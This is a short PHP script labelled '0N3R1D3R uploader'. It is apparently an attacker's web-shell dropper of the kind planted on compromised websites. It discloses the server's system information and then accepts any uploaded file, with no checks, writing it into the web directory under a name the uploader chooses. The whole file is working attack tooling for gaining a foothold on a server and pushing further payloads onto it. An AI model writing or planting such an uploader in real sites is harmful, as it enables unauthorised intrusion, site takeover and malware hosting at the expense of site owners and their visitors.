<?php
echo '<b>0N3R1D3R uploader</b>';
echo '<b><br><br>'.php_uname().'<br></b>';
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>SUKSES OM !!!</b><br><br>'; }
else { echo '<b>GAGAL OM !!!</b><br><br>'; }
}
?>